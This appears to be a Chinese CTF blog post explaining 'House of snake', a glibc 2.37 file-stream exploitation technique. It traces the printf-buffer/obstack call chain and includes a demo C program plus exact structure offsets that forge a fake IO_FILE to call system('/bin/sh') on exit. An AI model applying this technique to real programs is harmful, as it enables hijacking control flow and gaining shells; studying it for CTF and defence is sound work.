---
title: House_of_snake
author: Aapcer
date: 2023-03-24 13:37:00 +0800
categories: [攻击方式利用, House_of_snake]
tags: [House_of_snake, PWN, IO利用]
math: true
mermaid: true
comments: false
---

## 引言

> 好久没有更新文章了，吹雪哥团队给出了一个新的IO利用方式，本次就来记录一下XD，这个打法吹雪哥队说只能选择使用2.37的libc版本，可能有点限制条件

## malloc_assert之殇

> 2.36之后，malloc_assert就被🐏了，只剩下exit来打IO了，虽然废物我没怎么用过，说是高版本house_of_kiwi没法进行利用了

## 利用条件

- 可知`heap_base`和`lib_base`
- 能打一次`largebin_attack`想办法让其走我们伪造的IO，反正就是能任意地址写一个堆地址
- 程序执行IO的有关操作，包括但不限于：从`main`函数返回、调用`exit`函数

## 有关libc版本的问题

> **此攻击方式可以在2.37使用**，大佬说看源码应该可以

## 攻击路径

主要是利用`_IO_printf_buffer_as_file_jumps`中的 `__printf_buffer_as_file_overflow`函数

```
__printf_buffer_as_file_overflow (FILE *fp, int ch)
	__printf_buffer_flush_obstack ((struct __printf_buffer_obstack *) buf);
		obstack_1grow (buf->obstack, buf->ch);
        	_obstack_newchunk (__o, __len);
            	new_chunk = CALL_CHUNKFUN (h, new_size);
                	(*(h)->chunkfun)((h)->extra_arg, (size))
```

## 有关结构体

### `_IO_printf_buffer_as_file_jumps`跳转表

只有两个表项被初始化了，分别为_\_printf_buffer_as_file_overflow和__printf_buffer_as_file_xsputn

```c
static const struct _IO_jump_t _IO_printf_buffer_as_file_jumps libio_vtable =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, NULL),
  JUMP_INIT(overflow, __printf_buffer_as_file_overflow),//函数一
  JUMP_INIT(underflow, NULL),
  JUMP_INIT(uflow, NULL),
  JUMP_INIT(pbackfail, NULL),
  JUMP_INIT(xsputn, __printf_buffer_as_file_xsputn),//函数二
  JUMP_INIT(xsgetn, NULL),
  JUMP_INIT(seekoff, NULL),
  JUMP_INIT(seekpos, NULL),
  JUMP_INIT(setbuf, NULL),
  JUMP_INIT(sync, NULL),
  JUMP_INIT(doallocate, NULL),
  JUMP_INIT(read, NULL),
  JUMP_INIT(write, NULL),
  JUMP_INIT(seek, NULL),
  JUMP_INIT(close, NULL),
  JUMP_INIT(stat, NULL),
  JUMP_INIT(showmanyc, NULL),
  JUMP_INIT(imbue, NULL)
};
```

### `__printf_buffer_as_file`结构体

这个结构体和一般的IO_FILE_PLUS没啥区别，就是在下面多了一个指向__printf_buffer结构体的指针

```c
struct __printf_buffer
{
  char *write_base;
  char *write_ptr;
  char *write_end;
  uint64_t written;
  enum __printf_buffer_mode mode;
};

struct __printf_buffer_as_file
{
  /* Interface to libio.  */
  FILE stream;
  const struct _IO_jump_t *vtable;
 
  /* Pointer to the underlying buffer.  */
  struct __printf_buffer *next;
};
```

### `__printf_buffer_obstack`结构体

在`__printf_buffer结构体`下面加了一个`obstack结构体`指针

```c
struct __printf_buffer_obstack
{
  struct __printf_buffer base;
  struct obstack *obstack;
 
  char ch;
};

struct obstack          /* control current object in current chunk */
{
  long chunk_size;              /* preferred size to allocate chunks in */
  struct _obstack_chunk *chunk; /* address of current struct obstack_chunk */
  char *object_base;            /* address of object we are building */
  char *next_free;              /* where to add next char to current object */
  char *chunk_limit;            /* address of char after current chunk */
  union
  {
    PTR_INT_TYPE tempint;
    void *tempptr;
  } temp;                       /* Temporary for some macros.  */
  int alignment_mask;           /* Mask of alignment for each object. */
 
  struct _obstack_chunk *(*chunkfun) (void *, long);
  void (*freefun) (void *, struct _obstack_chunk *);
  void *extra_arg;              /* first arg for chunk alloc/dealloc funcs */
  unsigned use_extra_arg : 1;     /* chunk alloc/dealloc funcs take extra arg */
  unsigned maybe_empty_object : 1; /* There is a possibility that the current
 
  unsigned alloc_failed : 1;      /* No longer used, as we now call the failed
                     handler on error, but retained for binary
                     compatibility.  */
};
```

## 调用链分析

### `__printf_buffer_as_file_overflow`函数

```c
static int
__printf_buffer_as_file_overflow (FILE *fp, int ch)
{
  struct __printf_buffer_as_file *file = (struct __printf_buffer_as_file *) fp;
 
  __printf_buffer_as_file_commit (file);//一些小检测
 
  /* EOF means only a flush is requested.   */
  if (ch != EOF)
    __printf_buffer_putc (file->next, ch);//没啥重要的，不用理他
 
  /* Ensure that flushing actually produces room.  */
  if (!__printf_buffer_has_failed (file->next)
      && file->next->write_ptr == file->next->write_end)
    __printf_buffer_flush (file->next);//进入的主要函数
    [...]
}
```

把传入的FILE结构体转换为了`__printf_buffer_as_file结构体`来进行操作

### `__printf_buffer_as_file_commit`函数

```c
static void
__printf_buffer_as_file_commit (struct __printf_buffer_as_file *file)
{
  /* Check that the write pointers in the file stream are consistent
     with the next buffer.  */
  assert (file->stream._IO_write_ptr >= file->next->write_ptr);
  assert (file->stream._IO_write_ptr <= file->next->write_end);
  assert (file->stream._IO_write_base == file->next->write_base);
  assert (file->stream._IO_write_end == file->next->write_end);
 
  file->next->write_ptr = file->stream._IO_write_ptr;
}
```

就是需要我们传入的FILE文件的IO_write_*和__printf_buffer的IO_write\_\*满足上面的条件

### **`__printf_buffer_putc`函数**

```c
static inline void
__printf_buffer_putc (struct __printf_buffer *buf, char ch)
{
  if (buf->write_ptr != buf->write_end)
      *buf->write_ptr++ = ch;
  else
    __printf_buffer_putc_1 (buf, ch);
}
```

没啥用，不用鸟

### `__printf_buffer_do_flush`函数

```c
static void
__printf_buffer_do_flush (struct __printf_buffer *buf)
{
  switch (buf->mode)
    {
    case __printf_buffer_mode_failed:
    case __printf_buffer_mode_sprintf:
      return;
    case __printf_buffer_mode_snprintf:
      __printf_buffer_flush_snprintf ((struct __printf_buffer_snprintf *) buf);
      return;
    ......
    case __printf_buffer_mode_fphex_to_wide:
      __printf_buffer_flush_fphex_to_wide
        ((struct __printf_buffer_fphex_to_wide *) buf);
      return;
    case __printf_buffer_mode_obstack:
      __printf_buffer_flush_obstack ((struct __printf_buffer_obstack *) buf);
      return;
    }
  __builtin_trap ();
}
```

要走到`__printf_buffer_flush_obstack`函数，那么buf的mode要等于__printf_buffer_mode_obstack

### `__printf_buffer_flush_obstack`函数

```c

void
__printf_buffer_flush_obstack (struct __printf_buffer_obstack *buf)
{
  /* About to switch buffers, so record the bytes written so far.  */
  buf->base.written += buf->base.write_ptr - buf->base.write_base;
 
  if (buf->base.write_ptr == &buf->ch + 1)
    {
      /* Errors are reported via a callback mechanism (presumably for
     process termination).  */
      obstack_1grow (buf->obstack, buf->ch);
      [...]
    }
}
```

要满足`buf->base.write_ptr == &buf->ch + 1`，才能进入`obstack_1grow (buf->obstack, buf->ch)`

### **`obstack_1grow`宏定义**

```c
# define obstack_1grow(OBSTACK, datum)                          \
  __extension__                                      \
    ({ struct obstack *__o = (OBSTACK);                          \
       if (__o->next_free + 1 > __o->chunk_limit)                  \
     _obstack_newchunk (__o, 1);                          \
       obstack_1grow_fast (__o, datum);                          \
       (void) 0; })s
```

这个宏定义里面调用了`_obstack_newchunk`也就琴瑟琵琶里面用的，看了琴瑟琵琶就很好理解

### **`_obstack_newchunk`函数**

```c
void
_obstack_newchunk (struct obstack *h, int length)
{
  struct _obstack_chunk *old_chunk = h->chunk;
  struct _obstack_chunk *new_chunk;
  long new_size;
  long obj_size = h->next_free - h->object_base;
  long i;
  long already;
  char *object_base;
 
  /* Compute size for new chunk.  */
  new_size = (obj_size + length) + (obj_size >> 3) + h->alignment_mask + 100;
  if (new_size < h->chunk_size)
    new_size = h->chunk_size;
 
  /* Allocate and initialize the new chunk.  */
  new_chunk = CALL_CHUNKFUN (h, new_size);
  [...]
    
```

### `CALL_CHUNKFUN`宏定义

```c
# define CALL_CHUNKFUN(h, size) \
  (((h)->use_extra_arg)                                  \
   ? (*(h)->chunkfun)((h)->extra_arg, (size))                      \
   : (*(struct _obstack_chunk *(*)(long))(h)->chunkfun)((size)))
```

### 总结

其实很简单，只要我们在构造的IO_FILE的vtable后面加一个`__printf_buffer`指针，该`__printf_buff结构体`后面跟着一个`obstack结构体`，控制其指向的**obstack的属性**就可以了，如`h->chunkfun=&system`与`h->extra_arg=&bin_sh`

## Demo调试

这个Demo是我按照大佬的调用思路去写的，走的是exit调用IO，事先将IO_list_all改成了我们的fake_IO_FILE

> libc版本2.37_1

### 源码

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
		
	size_t *printf_buff_as_file = malloc(0x420);
	size_t *print_buff = malloc(0x420);
	size_t *obstack = malloc(0x420);
	
	size_t puts_addr = &puts;
	size_t lib_base = puts_addr - (0x7ffff7e379c0 - 0x7ffff7dbd000);
	size_t IO_printf_buffer_as_file_jumps = lib_base + (0x7ffff7fafd00 - 0x7ffff7dbd000);
	size_t bin_sh = lib_base + (0x7ffff7f721d2 - 0x7ffff7dbd000);
	size_t system = lib_base + (0x7ffff7e0bbd0 - 0x7ffff7dbd000);
	size_t IO_list_all = lib_base + (0x7ffff7fb4680 - 0x7ffff7dbd000);
	size_t *p2 = (size_t *)IO_list_all;
	
	
	*(printf_buff_as_file+0xd8/8)=IO_printf_buffer_as_file_jumps; //vtable
	*(printf_buff_as_file+0xe0/8)=(size_t)print_buff;		//fp->next
	*(printf_buff_as_file+0x20/8)=0;				//_IO_write_base
	*(printf_buff_as_file+0x28/8)=(size_t)print_buff+0x30+0x1;	//_IO_write_ptr
	*(printf_buff_as_file+0x30/8)=(size_t)print_buff+0x30+0x1;	//_IO_write_end
	
	*(print_buff+0x8/8)=(size_t)print_buff+0x30+0x1;//buffer->write_ptr
	*(print_buff+0x10/8)=(size_t)print_buff+0x30+0x1;//buffer->write_end
	*(print_buff+0x20/8)=0xb;
	*(print_buff+0x28/8)=(size_t)obstack;
	
	
	*(obstack+0x38/8)=system;
	*(obstack+0x48/8)=bin_sh;
	*(obstack+0x50/8) = 1;
	
	*p2 = printf_buff_as_file;
	
	exit(0);
	
	return 0;
}
```

直接开调

### 构造FAKE_IO_FILE结构体

![image-20230324153629127](/post/20230324/image-20230324153629127.png)

### 构造printf_buffer_obstack

![image-20230324153721099](/post/20230324/image-20230324153721099.png)

### 进入__printf_buffer_as_file_overflow函数

![image-20230324153809456](/post/20230324/image-20230324153809456.png)

### __printf_buffer_as_file_commit函数assert校验

![image-20230324153851142](/post/20230324/image-20230324153851142.png)

### 进入前IF语句中的校验

![image-20230324154619731](/post/20230324/image-20230324154619731.png)

### 进入__printf_buffer_flush 函数

![image-20230324153949516](/post/20230324/image-20230324153949516.png)

这里可以看到上一句就是和0xb进行比较，也就是buffer的mode

### 进入__printf_buffer_flush_obstack函数

![image-20230324154042790](/post/20230324/image-20230324154042790.png)

### 进入**_obstack_newchunk函数**

![image-20230324154146028](/post/20230324/image-20230324154146028.png)

后面就不跟了，和琴瑟琵琶差不多

## FAKE_IO_FILE伪造

那FAKE_IO如何伪造才可以调用`__printf_buffer_as_file_overflow`函数呢

### 走exit的

对`fp`的设置如下：地址为A

- `vtable`设置为`IO_printf_buffer_as_file_jumps`地址（加减偏移），使其能成功调用`__printf_buffer_as_file_overflow`即可，也就是***(fp+0xd8)=IO_printf_buffer_as_file_jumps地址（加减偏移）**
- `fp->next` = `print_buff`，也即***(fp+0xe0) = B**
- `fp->_IO_write_ptr`=`&print_buff+0x30+0x1`，也即***(fp+0x28)=B+0x30+0x1**
- `fp->_IO_write_end`=`&print_buff+0x30+0x1`，也即***(fp+0x30)=B+0x30+0x1**

对`print_buff`结构体的设置如下：地址为B

- `print_buff->write_ptr`=`&print_buff+0x30+0x1`，也即***(B+0x8)=B+0x30+0x1**
- `print_buff->write_end`=`&print_buff+0x30+0x1`，也即***(B+0x10)=B+0x30+0x1**
- `print_buff->mode`=`0xb`，也即***(B+0x20)=0xb**
- `print_buff->obstack`=`obstack`，也即***(B+0x28)=C**

对`obstack`结构体的设置如下：地址为C

- `obstack->chunkfun`=`&system`，也即***(C+0x38)=&system**
- `obstack->extra_arg`=`&bin_sh`，也即***(C+0x48)=&bin_sh**
- `obstack->use_extra_arg`=`1`，也即***(C+0x50)=1**

## 总结

> IO的打法越来越花，这次本次利用的是2.37的新的一种结构体，但是不知道GNU看到这篇文章后会不会把2.37的这个新的结构体给删掉，还是有一定的局限性，利用方式比魑魅魍魉简单点，但是比琴瑟琵琶困难
>
> 最近也比较忙，没有时间更新文章，继续努力
